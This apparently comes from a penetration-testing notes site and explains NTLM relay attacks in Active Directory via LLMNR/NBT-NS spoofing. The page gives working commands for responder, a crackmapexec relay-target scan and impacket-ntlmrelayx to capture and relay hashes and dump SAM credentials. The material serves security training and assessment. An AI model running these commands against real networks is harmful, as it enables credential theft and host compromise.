---
layout: default
title: NTLM Relay
parent: Active Directory
nav_order: 11
permalink: /ad/ntlmrelay/
---

# NTLM Relay
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If a windows client cannot resolve a hostname using DNS, it will use the Link-Local Multicast Name Resolution (LLMNR) protocol to ask neighbouring computers. LLMNR can be used to resolve both IPv4 and IPv6 addresses.

If this fails, NetBios Name Service (NBT-NS) will be used. NBT-NS is a similar protocol to LLMNR that serves the same purpose. The main difference between the two is NBT-NS works over IPv4 only.

On these occasions when LLMNR or NBT-NS are used to resolve a request, any host on the network who knows the IP of the host being asked about can reply. Even if a host replies to one of these requests with incorrect information, it will still be regarded as legitimate.

Therefore it is possible to intercept NTLMv1/v2 hashes when a client tries to authenticate against a spoofed service. If NTLMv1 is enabled they can be reused as Pass-The-Hash attacks. However, if only NTLMv2 hashes are intercepted they cannot be used in the same way. Instead they need to be replayed quickly as they are only valid for a short period of time.

## Prerequisites

- Network access.

## Exploit

Start by listening the network with `responder` to spoof any NTLM hash that could transit. If you catch NTLMv1 hash, just reuse it with Pass-the-Hash method.

```bash
sudo responder -wrfbudPF -I eth0
```

Otherwise, if you obtain NTLMv2 hashes, you will have to relay them. To do so, you can use `impacket-ntlmrelayx`. By default, if no command is given it will try to dump SAM hashes. To do so, one must first identify hosts where smb signing is disabled.

```bash
cme smb $RANGE --gen-relay-list targets.txt
```

Once this is done, it will be used as hosts where the NTLMv2 hashes are replayed. But first, the configuration file of `responder` must be modified to disable SMB and HTTP:

```bash
sudo vim /etc/responder/Responder.conf

[Responder Core]

; Servers to start
SQL = On
SMB = Off #Should be On when not combined with ntlmrelayx
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off #Should be On when not combined with ntlmrelayx
HTTPS = On
DNS = On
LDAP = On
```

Once the configuration file is modified, the two following commands can be ran simultaneously.

```bash
sudo responder -rdwPF -I eth0
sudo impacket-ntlmrelayx -tf targets.txt --http-port 8000 -of output.txt
```